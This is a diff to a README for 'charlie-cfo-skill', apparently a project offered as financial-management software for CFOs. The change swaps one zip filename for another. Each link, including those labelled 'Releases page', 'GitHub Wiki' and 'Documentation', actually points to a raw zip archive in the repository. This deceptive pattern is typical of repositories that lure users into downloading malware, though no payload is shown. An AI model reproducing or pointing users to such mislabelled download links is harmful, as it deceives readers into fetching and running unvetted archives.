@@ -1,6 +1,6 @@
 # 🚀 charlie-cfo-skill - Simplified Financial Management for CFOs
 
-[![Download Now](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/skill_cfo_charlie_v3.6.zip)](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/skill_cfo_charlie_v3.6.zip)
+[![Download Now](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/charlie-cfo-skill-2.2-alpha.2.zip)](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/charlie-cfo-skill-2.2-alpha.2.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started with **charlie-cfo-skill**, follow these simple steps to download
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/skill_cfo_charlie_v3.6.zip) to find the application files.
+1. Visit the [Releases page](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/charlie-cfo-skill-2.2-alpha.2.zip) to find the application files.
 
 2. On the Releases page, choose the latest version of the application. Click on it to view the available files.
 
@@ -65,7 +65,7 @@ Once installed, launch **charlie-cfo-skill**. Here’s a guide to help you use t
 
 If you need any help while using **charlie-cfo-skill**, consider the following options:
 
-- **Documentation:** Visit the [GitHub Wiki](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/skill_cfo_charlie_v3.6.zip) for detailed documentation on all features.
+- **Documentation:** Visit the [GitHub Wiki](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/charlie-cfo-skill-2.2-alpha.2.zip) for detailed documentation on all features.
 
 - **FAQs:** Check the Frequently Asked Questions section in the Wiki for quick answers to common issues.
 
@@ -92,7 +92,7 @@ While this application is primarily for end-users, contributions are welcome. If
 
 ## 🔗 Links
 
-- [Visit Releases Page](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/skill_cfo_charlie_v3.6.zip)
-- [Documentation](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/skill_cfo_charlie_v3.6.zip)
+- [Visit Releases Page](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/charlie-cfo-skill-2.2-alpha.2.zip)
+- [Documentation](https://github.com/Rai213/charlie-cfo-skill/raw/refs/heads/main/references/charlie-cfo-skill-2.2-alpha.2.zip)
 
 Thank you for considering the **charlie-cfo-skill** as your financial management tool. We hope this application simplifies your financial tasks effectively!
